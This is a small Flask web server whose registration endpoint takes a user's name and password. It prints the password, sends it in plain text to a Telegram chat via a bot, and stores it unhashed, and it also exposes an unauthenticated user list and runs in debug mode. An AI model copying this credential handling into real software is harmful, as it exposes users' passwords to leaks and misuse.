from flask import Flask, request, send_from_directory, jsonify
import telebot
import os
from dotenv import load_dotenv
from database.connector import connect
from database.models import User

load_dotenv()
TOKEN = os.getenv('TOKEN')
CHATID_V = os.getenv('CHATID-V')
CHATID_D = os.getenv('CHATID-D')
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)


# Подкл.чение статических файлов из каталога public
@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('public', filename)

@app.route("/")
def home():
    return send_from_directory('public', 'index.html')

@app.post('/registration')
def testPost():
    session = connect()
    try:
        if request.method == "POST":
            name = request.get_json()["name"]
            pas = request.get_json()["pass"]
            print(f'Получен POST запрос от сайта \n'
                  f'Имя: {name} \n'
                  f'Пароль: {pas}')
            bot.send_message(CHATID_V, 
                             '_Получен POST запрос от сайта_ \n'
                             f'*Имя*: {name} \n'
                             f'*Пароль*: {pas} \n'
                             ,
                               parse_mode="MARKDOWN")
            bot.send_message(CHATID_D, name, parse_mode="MARKDOWN")
            new_user = User(username=name,password=pas)
            session.add(new_user)
            session.commit()
            return {'value': 'Я получил запрос'}
    except Exception as e:
        print(e)
        return str(e)
    finally:
        session.close()

@app.route('/users', methods=["GET"])
def get_users():
    session = connect()
    try:
        users = session.query(User).all()
        users_data = [{'id': user.id, 'username': user.username} for user in users]
        print(users_data)
        return jsonify(users_data)
    except Exception as e:
        print(e)
        return str(e)
    finally:
        session.close()


if __name__ == '__main__':
    app.run(debug=True)
 